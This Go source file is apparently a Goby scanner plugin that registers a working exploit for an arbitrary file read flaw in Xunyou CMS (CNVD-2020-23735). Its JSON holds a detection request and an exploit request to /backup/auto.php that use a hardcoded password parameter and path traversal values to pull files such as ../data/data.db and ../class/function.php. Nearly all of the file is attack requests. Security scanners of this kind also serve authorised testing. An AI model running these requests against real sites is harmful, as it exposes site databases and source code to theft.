package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Xunyou CMS Local File read (CNVD-2020-23735)",
    "Description": "Xunyou cms has an arbitrary file reading vulnerability. Attackers can use vulnerabilities to obtain sensitive information.",
    "Product": "Xunyou CMS",
    "Homepage": "http://www.cnxunchi.com/",
    "DisclosureDate": "2020-04-25",
    "Author": "ovi3",
    "GobyQuery": "body=\"/skin/pc\" && body=\"/upfile/\"",
    "Level": "2",
    "Impact": "Attackers can use vulnerabilities to obtain sensitive information.",
    "Recommendation": "",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cnvd/CNVD-2020-23735.yaml",
        "https://www.cnvd.org.cn/flaw/show/2025171"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "filePath",
            "type": "createSelect",
            "value": "../backup/auto.php,../class/function.php,../data/data.db",
            "show": ""
        }
    ],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path=../backup/auto.php",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "'NzbwpQSdbY06Dngnoteo2wdgiekm7j4N'",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "$_GET['password']",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/backup/auto.php?password=NzbwpQSdbY06Dngnoteo2wdgiekm7j4N&path={{{filePath}}}",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "SetVariable": [
                "output|lastbody"
            ]
        }
    ],
    "Tags": [
        "fileread"
    ],
    "CVEIDs": null,
    "CNVDIDs": [
        "CNVD-2020-23735"
    ],
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "Xunyou CMS"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "6814"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}
